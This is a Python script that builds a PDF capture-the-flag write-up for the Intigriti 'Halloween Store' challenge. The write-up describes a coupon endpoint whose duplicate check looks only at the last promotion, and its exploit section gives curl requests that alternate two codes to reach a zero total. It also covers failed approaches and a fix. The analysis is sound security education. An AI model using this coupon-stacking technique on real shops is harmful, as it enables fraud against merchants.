#!/usr/bin/env python3
"""Build the Intigriti #1026 write-up as a PDF, using the same engine as the
HTB report pipeline (pdfgen + org style), with challenge branding instead of
the CONFIDENTIAL pentest chrome."""
import sys

sys.path.insert(0, "/home/assem/htb/reactor")

from pdfgen import Doc, PAGE_W, PAGE_H, width_of, inline_tokens, esc  # noqa: E402
from docstyle import NAVY, NAVY_SOFT, ACCENT, GREY, INK, SEV  # noqa: E402

HERE = "/home/assem/work/ctf-writeups/intigriti/halloween-store-1026"
OUT = HERE + "/Halloween_Store_1026_Writeup.pdf"
BYLINE = "4ss3m"
SOURCE = "github.com/ASSEMMERZOUG/ctf-writeups"
DATE = "21 October 2026"


def cover(d, kind, title, subtitle, facts, blurb, badge):
    d.rect(0, PAGE_H - 250, PAGE_W, 250, fill=NAVY)
    d.rect(0, PAGE_H - 256, PAGE_W, 6, fill=ACCENT)
    d.text(56, PAGE_H - 74, kind.upper(), "bold", 10, (0.62, 0.76, 0.95))
    d.text(56, PAGE_H - 100, "INTIGRITI CHALLENGES", "regular", 9, (0.45, 0.60, 0.82))
    d.line(56, PAGE_H - 112, 150, PAGE_H - 112, (0.35, 0.50, 0.78), 1.2)

    ty = PAGE_H - 150
    for line in title:
        d.text(56, ty, line, "bold", 30, (1, 1, 1))
        ty -= 36
    if subtitle:
        ty -= 4
        for tokens, _w in d.wrap(inline_tokens(subtitle), 12.5, PAGE_W - 112):
            d.rich_line(56, ty, tokens, 12.5, (0.72, 0.82, 0.96))
            ty -= 17
    d.y = ty

    y = min(d.y, PAGE_H - 300)
    if badge:
        d.rect(56, y - 20, width_of(badge, "bold", 10) + 22, 22, fill=SEV["MEDIUM"])
        d.text(67, y - 14, badge, "bold", 10, (1, 1, 1))
        y -= 44
    d.y = y
    for para in blurb:
        d.para(para, size=11, leading=1.5, color=INK, space_after=9)

    box_h = 58 + 22 * (len(facts) - 1)
    y = d.y - 26
    if y - box_h < 70:          # keep the panel on the page
        y = 70 + box_h
    d.rect(56, y - box_h, PAGE_W - 112, box_h,
           fill=(0.965, 0.972, 0.985), stroke=(0.86, 0.89, 0.93))
    d.text(72, y - 22, "CHALLENGE DETAILS", "bold", 8.5, NAVY_SOFT)
    yy = y - 42
    for k, v in facts:
        d.text(72, yy, k, "bold", 9.5, GREY)
        d.text(200, yy, v, "regular", 9.5, INK)
        yy -= 22
    d.y = y - box_h - 24


def bar(d, text):
    d.rect(0, PAGE_H - 74, PAGE_W, 48, fill=NAVY)
    d.text(56, PAGE_H - 58, text, "bold", 13.5, (1, 1, 1))
    d.y = PAGE_H - 100


def h1(d, num, text):
    """Section opener: a full navy bar on a fresh page, an inline heading when
    there is still most of a page left to fill."""
    label = "%s  %s" % (num, text.upper())
    if not d.pages[-1] or d.y < PAGE_H * 0.5:
        d.new_page()
        bar(d, label)
    else:
        d.y -= 18
        d.text(d.ml, d.y - 15, label, "bold", 14, NAVY)
        d.y -= 21
        d.rect(d.ml, d.y, 60, 2.5, fill=ACCENT)
        d.y -= 16


def h2(d, text):
    d.heading(text, size=13, color=NAVY, space_before=14, space_after=5, rule=True)


def h3(d, text):
    d.heading(text, size=11, color=NAVY_SOFT, space_before=10, space_after=4)


def decorate(d, hdr):
    for i, page in enumerate(d.pages, 1):
        page.insert(0,
                    "q 0.930 0.930 0.935 rg BT /F2 58 Tf "
                    "0.7071 0.7071 -0.7071 0.7071 95 250 Tm "
                    "(%s) Tj ET Q" % BYLINE)
        page.append("%.3f %.3f %.3f rg 0 %.2f %.2f 26 re f"
                    % (NAVY[0], NAVY[1], NAVY[2], PAGE_H - 26, PAGE_W))
        page.append("BT 0.800 0.870 0.960 rg /F1 7.2 Tf %.2f %.2f Td (%s) Tj ET"
                    % (d.ml, PAGE_H - 17, esc(hdr % i)))


def main():
    d = Doc(footer="Intigriti #1026 - Halloween Store | Write-up by %s | %s"
                   % (BYLINE, DATE), page_label=False)

    cover(
        d, "Challenge Write-up",
        ["Halloween Store", "#1026"],
        "An order-dependent duplicate check on the coupon endpoint. "
        "Stacking two 20%-off and two 30%-off promotions takes the total to zero "
        "and puts the flag in the receipt.",
        [
            ("Challenge", "Intigriti #1026 - Halloween Store"),
            ("Platform", "Intigriti Challenges"),
            ("Author", "Assem Merzoug (4ss3m)"),
            ("Solved", "20 October 2026"),
            ("Submission", "INTIGRITI-HKU11YF5"),
            ("Bug class", "Business logic error (CWE-840)"),
            ("Severity", "Medium"),
            ("Flag", "INTIGRITI{redacted}"),
        ],
        ["The store gives every new session EUR 66.00 of credit and sells the "
         "Midnight Collection for EUR 666.00. Two advertised coupons reach 50% "
         "when combined; the goal needs 90.09%. The bug that closes the gap is "
         "a duplicate check that only looks at the most recent promotion, so "
         "alternating two codes stacks both of them twice."],
        "MEDIUM - CWE-840",
    )

    # 1 -------------------------------------------------------------------
    h1(d, "1", "The Challenge")
    d.para("The target is a fake candy store: five bags of candy priced between "
           "EUR 8.90 and EUR 14.90, and one gift box - The Midnight Collection - "
           "at **EUR 666.00**. Every session starts with **EUR 66.00** of store "
           "credit, ten times less than the vault costs.", size=10  , space_after=7)
    d.para("Two coupon codes are advertised on the site:", size=10, space_after=6)
    d.table(
        ["Code", "Discount", "Requirement"],
        [["NIGHT20", "20%", "cart must contain the Midnight Collection"],
         ["NEWS30", "30%", "newsletter signup + first order + vault in cart"]],
        widths=[1.1, 0.9, 5.0], size=9,
    )
    d.para("The cart is append-only - there is no remove endpoint, so whatever is "
           "added stays. A discount amount is frozen at apply time as "
           "`percent x subtotal`, and the order total is `subtotal - discount`.",
           size=10, space_after=7)
    d.para("Making the vault affordable needs a discount of at least "
           "**EUR 600.00 (90.09%)**. Both coupons together give exactly 50%, so "
           "a legitimate checkout is far out of reach. That gap is the puzzle: "
           "the discount has to be applied more than once.", size=10, space_after=7)

    # 2 -------------------------------------------------------------------
    h1(d, "2", "The Tell")
    d.para("The store frontend contains a line that never renders for a normal "
           "user - the label it produces only appears when a promotion has been "
           "applied more than once:", size=10, space_after=6)
    d.code(['promotion.percent + "% off" +',
            '  (promotion.count > 1 ? ` x ${promotion.count}` : "")'], size=8.6)
    d.para("The UI knows how to display a coupon that was applied twice. Nothing "
           "a user can click produces `count > 1`, so the server must have a path "
           "that does.", size=10, space_after=7)

    # 3 -------------------------------------------------------------------
    h1(d, "3", "Testing the Coupon Endpoint")
    d.para("`POST /api/cart/coupon` takes `{\"code\": \"...\"}` and returns the "
           "full cart. Re-sending the same code returns `409 "
           "coupon_already_applied`. That check looked solid until I tried it in a "
           "different order:", size=10, space_after=6)
    d.code(['apply NIGHT20  -> 200, NIGHT20 count 1',
            'apply NIGHT20  -> 409 coupon_already_applied   (rejected)',
            'apply NEWS30   -> 200, NEWS30 count 1',
            'apply NIGHT20  -> 200, NIGHT20 count 2         (not rejected)',
            'apply NEWS30   -> 200, NEWS30 count 2'], size=8.6)
    d.para("The duplicate check compares the submitted code with the **most "
           "recently applied promotion only** - not with the whole promotions "
           "list. Applying a different code in between clears the way to apply "
           "the first one again.", size=10, space_after=7)
    d.para("Discounts are additive, so two stacks of each coupon give "
           "20 + 20 + 30 + 30 = **100%**.", size=10, space_after=7)

    # 4 -------------------------------------------------------------------
    h1(d, "4", "Exploit")
    d.para("Eight requests from a fresh session. Each one carries the `session` "
           "cookie issued by the first call.", size=10, space_after=6)
    d.code([
        "B=https://challenge-1026.challenges.intigriti.io",
        "",
        "# session (also signs up nothing yet)",
        "curl -c jar -b jar $B/api/session",
        "# newsletter signup, required by NEWS30",
        "curl -c jar -b jar $B/api/newsletter -H 'Content-Type: application/json' \\",
        "     -d '{\"email\":\"x@example.com\"}'",
        "# the vault, required by both coupons",
        "curl -c jar -b jar $B/api/cart/items -H 'Content-Type: application/json' \\",
        "     -d '{\"productId\":\"midnight-vault\"}'",
        "",
        "# alternate the codes: each pair stacks both promotions to count 2",
        "curl -c jar -b jar $B/api/cart/coupon -H 'Content-Type: application/json' \\",
        "     -d '{\"code\":\"NIGHT20\"}'",
        "curl -c jar -b jar $B/api/cart/coupon -H 'Content-Type: application/json' \\",
        "     -d '{\"code\":\"NEWS30\"}'",
        "curl -c jar -b jar $B/api/cart/coupon -H 'Content-Type: application/json' \\",
        "     -d '{\"code\":\"NIGHT20\"}'",
        "curl -c jar -b jar $B/api/cart/coupon -H 'Content-Type: application/json' \\",
        "     -d '{\"code\":\"NEWS30\"}'",
        "",
        "curl -c jar -b jar $B/api/checkout -H 'Content-Type: application/json' \\",
        "     -d '{}'",
    ], size=7.4)

    d.need(70)
    d.para("Cart state immediately before checkout:", size=10, space_after=6)
    d.code(["subtotal 66600   discount 66600   total 0",
            "promotions: NIGHT20 x2 (20%), NEWS30 x2 (30%)"], size=8.6)
    d.para("Checkout returns `200` with `paid: 0`. The credit balance is never "
           "touched, and the receipt carries the flag.", size=10, space_after=8)

    d.need(300)
    d.figure(HERE + "/checkout-redacted.png",
             caption="Checkout response: totals of 66600 discount, 0 paid, flag "
                     "and order identifiers redacted.", max_h=250)

    # 5 -------------------------------------------------------------------
    h1(d, "5", "What Did Not Work, and Why")
    d.bullets([
        "**Unicode / case / whitespace variants** of the codes were normalised to "
        "the same canonical code before lookup and dedupe (`NIGHT20\\n`, "
        "`night20`, non-breaking space, tabs all behaved identically) - no "
        "normalisation bypass.",
        "**Concurrent applies** (48 parallel requests, and apply-versus-remove "
        "races) were handled strictly sequentially; the promotions list never "
        "gained a duplicate this way.",
        "**Body overposting** with `percent`, `amount` or `count` fields was "
        "ignored - only `code` is read.",
        "**Slow-body races** against checkout were pointless: the proxy buffers "
        "the request body, so the cart snapshot always includes everything added "
        "before the body finished upload.",
    ], size=9.6)

    # 6 -------------------------------------------------------------------
    h1(d, "6", "Root Cause and Fix")
    d.para("The promotion list holds one entry per code, each with a `count`. The "
           "duplicate check reads only the last element of that list, so it only "
           "protects against applying the same code twice in a row.", size=10,
           space_after=7)
    d.para("**Fix.** Check the submitted code against every promotion in the "
           "cart, not just the most recent one. Enforce `count == 1` per code "
           "server-side regardless of ordering, cap the total discount at the "
           "subtotal, and re-validate coupon eligibility at checkout instead of "
           "trusting the values frozen at apply time.", size=10, space_after=7)

    # 7 -------------------------------------------------------------------
    h1(d, "7", "Impact")
    d.para("A shopper can stack the same promotional code without limit by "
           "alternating it with another code, bypassing the one-use-per-promotion "
           "rule entirely. In this challenge that turned a EUR 666.00 item into a "
           "EUR 0.00 order using only the EUR 66.00 of starting credit.", size=10,
           space_after=7)
    d.para("In a real storefront the same bug is unbounded discount abuse: any "
           "attacker can drive any cart to zero, and if the pattern extends to "
           "credit-bearing or referral promotions, it becomes direct financial "
           "loss rather than a challenge shortcut.", size=10, space_after=10)

    d.para("Write-up by %s - %s" % (BYLINE, SOURCE), size=8.6, color=GREY)

    hdr = ("INTIGRITI #1026 // HALLOWEEN STORE | WRITE-UP | Page %%d | "
           "Prepared by: %s | %s | %s" % (BYLINE, DATE, SOURCE))
    decorate(d, hdr)
    n = d.build(OUT)
    print("%s: %d pages" % (OUT.rsplit("/", 1)[-1], n))


if __name__ == "__main__":
    main()
